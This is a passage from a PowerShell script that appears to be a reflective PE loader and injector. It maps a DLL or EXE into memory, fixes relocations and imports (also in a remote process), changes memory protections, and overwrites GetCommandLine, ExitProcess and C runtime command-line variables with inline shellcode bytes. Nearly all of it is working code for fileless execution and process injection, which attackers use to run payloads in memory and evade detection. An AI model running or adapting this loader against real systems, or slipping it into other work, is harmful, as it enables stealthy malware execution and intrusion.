				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
